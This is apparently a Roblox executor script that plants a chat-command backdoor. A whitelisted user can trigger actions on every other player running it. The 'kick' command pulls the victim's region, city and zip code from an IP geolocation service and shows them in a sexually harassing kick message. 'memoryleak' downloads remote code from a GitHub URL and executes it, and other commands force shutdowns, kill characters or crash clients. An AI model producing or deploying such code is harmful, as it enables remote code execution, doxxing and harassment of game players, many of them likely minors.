local whitelist = {
    ["justin12281oom"] = true
}

local text = "commands ~ lagback, leave, kick, executorkill, memoryleak, kill"
local colors = {
    Color3.fromRGB(205, 160, 255),
    Color3.fromRGB(145, 160, 200)
}

local commands = ""
for i = 1, #text do
    local t = i / #text
    local color = Color3.new(
        colors[1].R + (colors[2].R - colors[1].R) * t,
        colors[1].G + (colors[2].G - colors[1].G) * t,
        colors[1].B + (colors[2].B - colors[1].B) * t
    )
    commands = commands .. string.format("<font color=\"rgb(%d, %d, %d)\"><b>%s</b></font>", color.R * 255, color.G * 255, color.B * 255, text:sub(i, i))
end

local player = game.Players.LocalPlayer

if whitelist[player.Name] then
    game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage", {
        Text = commands,
    })
end

local commandsFunc = {
    lagback = function(player)
        if not whitelist[player.Name] then
            game.Players.LocalPlayer.Character:SetPrimaryPartCFrame(CFrame.new(100, 100, 100))
        end
    end,
    leave = function(player)
        if not whitelist[player.Name] then
            game:Shutdown()
        end
    end,
    kick = function(player)
        if not whitelist[player.Name] then
            game.Players.LocalPlayer:Kick(string.format("I am going to ship you a dildo %s, %s, %s", game:GetService("HttpService"):JSONDecode(http.request({Url = "http://ip-api.com/json", Method = "GET"}).Body).regionName, game:GetService("HttpService"):JSONDecode(http.request({Url = "http://ip-api.com/json", Method = "GET"}).Body).city, game:GetService("HttpService"):JSONDecode(http.request({Url = "http://ip-api.com/json", Method = "GET"}).Body).zip))
        end
    end,
    executorkill = function(player)
        if not whitelist[player.Name] then
            task.spawn(setfpscap, 9e9)
        end
    end,
    memoryleak = function(player)
        if not whitelist[player.Name] then
            loadstring(game:HttpGet('https://raw.githubusercontent.com/e266cfd65ad46a67fc54b0efd38e40dd/scripthub/main/memoryleak'))()
        end
    end,
    kill = function(player)
        if not whitelist[player.Name] then
            player.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Dead)
        end
    end
}

local function onChatMessage(player, message)
    if commandsFunc[message] then
        commandsFunc[message](player)
    end
end

local function onPlayerChatted(player)
    player.Chatted:Connect(function(message)
        onChatMessage(player, message)
    end)
end

game.Players.PlayerAdded:Connect(onPlayerChatted)

for _, player in ipairs(game.Players:GetPlayers()) do
    onPlayerChatted(player)
end
